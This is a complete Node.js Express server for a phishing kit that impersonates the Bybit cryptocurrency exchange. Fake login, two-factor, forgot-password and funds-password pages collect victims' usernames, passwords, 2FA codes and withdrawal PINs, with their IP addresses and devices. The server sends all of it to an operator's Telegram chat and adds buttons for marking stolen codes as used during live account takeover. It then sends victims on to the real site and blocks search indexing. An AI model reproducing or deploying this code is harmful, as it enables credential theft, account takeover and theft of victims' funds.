'use strict';
const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = (process.env.BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.CHAT_ID || '').trim();
const PUBLIC_URL = (process.env.PUBLIC_URL || '').trim().replace(/\/$/, '');
const SECRET = (process.env.WEBHOOK_SECRET || crypto.createHash('sha1').update(BOT_TOKEN || 'x').digest('hex')).slice(0, 24);
const REDIRECT_URL = (process.env.REDIRECT_URL || 'https://www.bybit.com/en/').trim();
const TTL = 30 * 60 * 1000;

app.set('trust proxy', true);
app.disable('x-powered-by');
app.use(express.urlencoded({ extended: false, limit: '32kb' }));
app.use(express.json({ limit: '32kb' }));

const V = {};
for (const n of ['login', 'twofa', 'forgot', 'funds', 'done']) {
  V[n] = fs.readFileSync(path.join(__dirname, 'views', n + '.html'), 'utf8');
}
const CSS = fs.readFileSync(path.join(__dirname, 'views', 'app.css'), 'utf8');

const sessions = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now - s.at > TTL) sessions.delete(k);
}, 300000).unref();

const esc = (v) =>
  String(v ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

const ipOf = (req) =>
  (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';

function device(ua = '') {
  const b = /Edg\//.test(ua) ? 'Edge' : /OPR\/|Opera/.test(ua) ? 'Opera'
    : /SamsungBrowser/.test(ua) ? 'Samsung' : /Chrome\//.test(ua) ? 'Chrome'
    : /Firefox\//.test(ua) ? 'Firefox' : /Safari\//.test(ua) ? 'Safari' : 'Unknown';
  const o = /Android/.test(ua) ? 'Android' : /iPhone|iPad|iPod/.test(ua) ? 'iOS'
    : /Windows/.test(ua) ? 'Windows' : /Mac OS X/.test(ua) ? 'macOS' : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  return `${b} / ${o}`;
}

const stamp = () =>
  new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Africa/Lagos', day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false,
  }).format(new Date()) + ' WAT';

const maskMail = (v) => { const [n, d] = String(v).split('@'); return d ? n.slice(0, 2) + '***@' + d : 'your email'; };
const maskPhone = (v) => { const s = String(v).replace(/\s/g, ''); return s.length > 5 ? s.slice(0, 3) + '****' + s.slice(-2) : 'your phone'; };

async function tg(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) { console.log('[tg] missing env\n' + text); return; }
  try {
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (keyboard) body.reply_markup = keyboard;
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
    });
    if (!r.ok) console.error('[tg]', r.status, await r.text());
  } catch (e) { console.error('[tg]', e.message); }
}

function cookies(req) {
  const o = {};
  (req.headers.cookie || '').split(';').forEach((p) => {
    const i = p.indexOf('=');
    if (i > 0) o[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
  });
  return o;
}

const sidOf = (req) => (req.body && req.body.s) || req.query.s || cookies(req).sid || '';

function touch(req, res) {
  const existing = sidOf(req);
  if (existing && sessions.has(existing)) { const s = sessions.get(existing); s.at = Date.now(); return s; }
  const sid = crypto.randomBytes(9).toString('hex');
  const s = { sid, at: Date.now(), ip: ipOf(req), ua: req.headers['user-agent'] || '', login: '', mail: '', phone: '', codes: 0, method: 'auth' };
  sessions.set(sid, s);
  res.setHeader('Set-Cookie', `sid=${sid}; Path=/; Max-Age=1800; HttpOnly; SameSite=Lax`);
  return s;
}

const must = (req) => { const sid = sidOf(req); return (sid && sessions.get(sid)) || null; };

const render = (n, sid, extra = {}) => {
  let out = V[n].replaceAll('{{SID}}', sid).replaceAll('{{REDIRECT}}', REDIRECT_URL);
  for (const k of Object.keys(extra)) out = out.replaceAll('{{' + k + '}}', extra[k]);
  return out;
};

const send = (res, html) => { res.setHeader('Cache-Control', 'no-store'); res.send(html); };

/* ---------- pages ---------- */

app.get('/app.css', (_q, res) => { res.type('text/css').send(CSS); });

app.get('/', (req, res) => {
  const s = touch(req, res);
  send(res, render('login', s.sid));
});

app.get('/2fa', (req, res) => {
  const s = must(req);
  if (!s) return res.redirect('/?e=1');
  const m = req.query.m || s.method;
  send(res, render('twofa', s.sid, {
    MAIL: esc(maskMail(s.mail || s.login)),
    PHONE: esc(maskPhone(s.phone || s.login)),
    METHOD: esc(m),
  }));
});

app.get('/forgot', (req, res) => { const s = touch(req, res); send(res, render('forgot', s.sid)); });

app.get('/funds', (req, res) => {
  const s = must(req);
  if (!s) return res.redirect('/?e=1');
  send(res, render('funds', s.sid));
});

app.get('/done', (req, res) => { const s = touch(req, res); send(res, render('done', s.sid)); });

/* ---------- api ---------- */

app.post('/api/login', async (req, res) => {
  const s = touch(req, res);
  const l = String(req.body.l || '').trim().slice(0, 120);
  const p = String(req.body.p || '').slice(0, 120);
  s.login = l;
  if (l.includes('@')) s.mail = l; else s.phone = l;
  await tg(
    '🟡 <b>BYBIT — LOGIN</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code>\n\n` +
    `<b>Login:</b> <code>${esc(l)}</code>\n` +
    `<b>Password:</b> <code>${esc(p)}</code>\n\n` +
    `<b>IP:</b> ${esc(s.ip)}\n<b>Device:</b> ${esc(device(s.ua))}\n<b>Time:</b> ${stamp()}`
  );
  res.json({ ok: true, next: '/2fa?s=' + s.sid });
});

app.post('/api/code', async (req, res) => {
  const s = touch(req, res);
  const code = String(req.body.code || '').replace(/\D/g, '').slice(0, 10);
  const method = String(req.body.method || 'auth');
  s.codes += 1;
  s.method = method;
  await tg(
    '🔑 <b>BYBIT — 2FA CODE</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code> · attempt ${s.codes} · <b>${esc(method.toUpperCase())}</b>\n\n` +
    `<b>Login:</b> <code>${esc(s.login || 'n/a')}</code>\n` +
    `<b>Code:</b> <code>${esc(code)}</code>\n\n` +
    `<b>IP:</b> ${esc(ipOf(req))}\n<b>Device:</b> ${esc(device(req.headers['user-agent']))}\n<b>Time:</b> ${stamp()}`,
    { inline_keyboard: [[
      { text: '✅ Used', callback_data: 'used:' + s.sid },
      { text: '❌ Wrong', callback_data: 'wrong:' + s.sid },
    ]] }
  );
  res.json({ ok: true, next: '/done?s=' + s.sid });
});

app.post('/api/resend', async (req, res) => {
  const s = touch(req, res);
  await tg(`♻️ <b>BYBIT — CODE RESENT</b>\n<code>#${s.sid.slice(0, 6)}</code> · ${esc(req.body.method || '')} · ${esc(s.login || 'n/a')}\n${stamp()}`);
  res.json({ ok: true });
});

app.post('/api/forgot', async (req, res) => {
  const s = touch(req, res);
  await tg(
    '🔎 <b>BYBIT — FORGOT PASSWORD</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code>\n\n` +
    `<b>Login:</b> <code>${esc(req.body.l || '')}</code>\n\n` +
    `<b>IP:</b> ${esc(ipOf(req))}\n<b>Time:</b> ${stamp()}`
  );
  res.json({ ok: true });
});

app.post('/api/funds', async (req, res) => {
  const s = touch(req, res);
  const pin = String(req.body.pin || '').replace(/\D/g, '').slice(0, 6);
  await tg(
    '💸 <b>BYBIT — FUNDS PASSWORD</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code> · ${esc(s.login || 'n/a')}\n\n` +
    `<b>Password:</b> <code>${esc(pin)}</code>\n${stamp()}`,
    { inline_keyboard: [[
      { text: '✅ Used', callback_data: 'used:' + s.sid },
      { text: '❌ Wrong', callback_data: 'wrong:' + s.sid },
    ]] }
  );
  res.json({ ok: true });
});

app.post('/tg/:secret', async (req, res) => {
  res.sendStatus(200);
  if (req.params.secret !== SECRET || !BOT_TOKEN) return;
  const q = req.body && req.body.callback_query;
  if (!q) return;
  const [act, sid] = String(q.data || '').split(':');
  const s = sessions.get(sid);
  if (s) s.mark = act;
  const label = act === 'used' ? '✅ MARKED USED' : '❌ MARKED WRONG';
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: q.id, text: label }),
  }).catch(() => {});
  if (q.message) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: q.message.chat.id, message_id: q.message.message_id,
        text: (q.message.text || '') + `\n\n<b>${label}</b>`, parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      }),
    }).catch(() => {});
  }
});

app.get('/robots.txt', (_q, res) => res.type('text/plain').send('User-agent: *\nDisallow: /'));
app.get('/health', (_q, res) => res.type('text/plain').send('ok'));
app.use((_q, res) => res.redirect('/'));

app.listen(PORT, '0.0.0.0', async () => {
  console.log('listening on ' + PORT);
  if (PUBLIC_URL && BOT_TOKEN) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: `${PUBLIC_URL}/tg/${SECRET}`, allowed_updates: ['callback_query'] }),
      });
      console.log('webhook set');
    } catch (e) { console.error('webhook', e.message); }
  }
});
